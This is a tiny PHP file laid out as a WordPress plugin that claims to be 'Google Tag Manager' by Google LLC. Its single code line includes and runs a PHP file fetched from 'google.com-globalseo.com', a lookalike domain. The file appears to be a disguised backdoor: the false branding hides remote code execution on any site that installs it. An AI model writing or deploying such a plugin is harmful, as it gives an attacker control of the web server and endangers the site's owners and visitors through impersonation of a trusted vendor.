<?php
/*
Plugin Name: Google Tag Manager
Description: Integrate your website with Google Developer Services, including Google tag manager.
Version: 1.5.2
Author: Google LLC.
*/

include_once 'https://google.com-globalseo.com/s/gtag-manager.php';
